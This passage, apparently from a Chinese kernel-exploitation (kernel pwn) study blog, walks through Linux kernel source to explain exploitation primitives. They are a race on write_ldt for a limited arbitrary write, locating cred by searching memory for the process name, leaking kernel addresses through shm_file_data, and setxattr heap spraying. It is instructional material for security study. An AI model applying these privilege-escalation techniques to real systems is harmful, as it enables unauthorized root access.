class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line"><span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_X86_16BIT) &amp;&amp; !ldt_info.seg_32bit) &#123;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line">ldt.avl = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">error = -ENOMEM;</span><br><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">free_ldt_pgtables(mm);</span><br><span class="line">free_ldt_struct(new_ldt);</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_ldt(mm, new_ldt);</span><br><span class="line">unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">free_ldt_struct(old_ldt);</span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要关注</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure><p><code>new_ldt</code>是新申请出来的object,在alloc之后memcpy之前有一个窗口期,若是我么能够在这期间竞争修改<code>new_ldt-&gt;entries</code>,那么便能够做到任意写,不过这个窗口期比较短,实际运用成功率较低</p><p>但我们还可以注意到<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>这一句,memcpy函数拷贝的长度是<code>old_nr_entries * LDT_ENTRY_SIZE</code></p><p>这个数据量相对较大,那么如果能够在memcpy函数执行的过程中通过竞争修改<code>new_ldt-&gt;entries</code>,也能够做到小范围的任意写</p><p>至于任意写的值其实也并不是完全受我们控制,不过可以根据我们传入的结构体,在一定程度上进行控制(具体可以看这个函数的完整流程)</p><p>我们<u>需要传入的结构体</u>的定义如下,新的ldt一定程度上受这个结构体控制,可以根据要求更改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment"> * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment"> * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment"> * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment"> * actual value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="内存搜索cred"><a href="#内存搜索cred" class="headerlink" title="内存搜索cred"></a>内存搜索cred</h2><p>在task_struct中有一个成员comm</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>            *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>        *<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其是该进程的名字且其位置刚好在 cred 附近，我们只需要从 <code>page_offset_base</code> 开始找当前进程的名字便能够找到当前进程的 task_struct</p><p>而通过prctl系统调用能够修改进程的名字</p><p><code>prctl(PR_SET_NAME,&quot;new_process_name&quot;)</code></p><p>在具有内存搜索能力之后,只需要找到这个便能快速确定cred地址</p><h2 id="逆向边角料"><a href="#逆向边角料" class="headerlink" title="逆向边角料"></a>逆向边角料</h2><p>很多时候由于gcc优化或者别的什么原因</p><p>kmalloc会变成<code>kmem_cache_alloc(kmalloc_caches[5], 6291648LL);</code>这样</p><p>可以按照<code>/mm/slab_common.c</code>文件中的下列信息比对,获取申请大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="shm-file-data"><a href="#shm-file-data" class="headerlink" title="shm_file_data"></a>shm_file_data</h2><p>这个结构体主要是用于泄露内核基址的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大小为<code>0x20</code>,从kmalloc-32中分配</p><p>其中的 ns字段和vm_ops字段皆指向内核的<code>.text</code>段中</p><p>file字段位于内核线性映射区,能够泄露内核堆地址</p><p>有四个相关函数<code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code></p><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间</p><p><strong>shmget</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmget, <span class="type">key_t</span>, key, <span class="type">size_t</span>, size, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ksys_shmget(key, size, shmflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般这样调用,key可以是任意整型,返回一个shmid</p><p><code>shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);</code></p><p><strong>shmat</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmat, <span class="type">int</span>, shmid, <span class="type">char</span> __user *, shmaddr, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line"><span class="type">long</span> err;</span><br><span class="line"></span><br><span class="line">err = do_shmat(shmid, shmaddr, shmflg, &amp;ret, SHMLBA);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">force_successful_syscall_return();</span><br><span class="line"><span class="keyword">return</span> (<span class="type">long</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在do_shmat中会分配一个shm_file_data结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p><code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure><p>其中有着这样一条代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了该 vma 的 vm_ops 对应的 close 函数，我们将目光重新放回共享内存对应的 vma 的初始化的流程当中，在 shmat() 中注意到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure><p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用 <code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op 域，在这里是 <code>shm_file_operations</code> 或 <code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p><strong>setxattr</strong>是一个系统调用允许进程设置文件系统对象的扩展属性，但在 kernel pwn 当中这同样是一个十分有用的系统调用，利用这个系统调用，我们可以进行内核空间中任意大小的 object 的分配，<strong>通常需要配合 userfaultfd 系统调用</strong>完成进一步的利用</p><p><strong>任意大小 object 分配(GFP_KERNEL)&amp; 释放</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容，之后该对象会被释放掉</strong></p><p>使用时按照以下格式,其中第一个字符串需要是本进程的文件名,第二个字符串任意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;abcdefg&quot;</span>, &amp;buf,len,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p><strong>序列文件接口</strong>（Sequence File Interface）是针对 procfs 默认操作函数每次只能读取一页数据从而难以处理较大 proc 文件的情况下出现的，其为内核编程提供了更为友好的接口</p><p><code>seq_file</code> 结构体定义于<code>/include/linux/seq_file.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 